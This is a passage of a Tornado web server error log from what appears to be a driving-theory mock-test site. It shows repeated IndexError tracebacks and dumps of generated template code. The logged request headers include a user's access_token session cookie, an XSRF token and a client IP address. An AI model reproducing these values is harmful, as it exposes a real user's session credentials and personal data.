 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c81dc8e4c8548017fb434&answers=%5B3%5D&cursor=16&_xsrf=45ed7cd361544cce8deab2d9771192fc', headers={'Content-Length': '93', 'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Cache-Control': 'no-cache', 'X-Real-Ip': '94.169.91.254', 'Referer': 'http://www.intheory.co.uk/test/new#', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie': '_xsrf=45ed7cd361544cce8deab2d9771192fc; access_token=QUFBRzZsTmNzNkdjQkFHOXE3c3JDeHVWbWZIUHNhZmloWkFaQmtCSTdhU1pBZFpBZUU0WkNaQXBhY3JpMk1FWkNUa1Z3bFFEWWJXaEZuRzc5WG82V0hZMWtxQWRjZW5BM2NMZ0ViNDNoZjhIRXdaRFpE|1348239817|53e3d3776138a3463bca29111c00251614f117cb; __utma=188782963.1379251504.1348239775.1348239775.1348239775.1; __utmb=188782963.3.10.1348239775; __utmc=188782963; __utmz=188782963.1348239775.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 97.46ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c81dc8e4c8548017fb434&answers=%5B3%5D&cursor=16&_xsrf=45ed7cd361544cce8deab2d9771192fc', headers={'Content-Length': '93', 'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Cache-Control': 'no-cache', 'X-Real-Ip': '94.169.91.254', 'Referer': 'http://www.intheory.co.uk/test/new#', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie': '_xsrf=45ed7cd361544cce8deab2d9771192fc; access_token=QUFBRzZsTmNzNkdjQkFHOXE3c3JDeHVWbWZIUHNhZmloWkFaQmtCSTdhU1pBZFpBZUU0WkNaQXBhY3JpMk1FWkNUa1Z3bFFEWWJXaEZuRzc5WG82V0hZMWtxQWRjZW5BM2NMZ0ViNDNoZjhIRXdaRFpE|1348239817|53e3d3776138a3463bca29111c00251614f117cb; __utma=188782963.1379251504.1348239775.1348239775.1348239775.1; __utmb=188782963.3.10.1348239775; __utmc=188782963; __utmz=188782963.1348239775.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 76.09ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
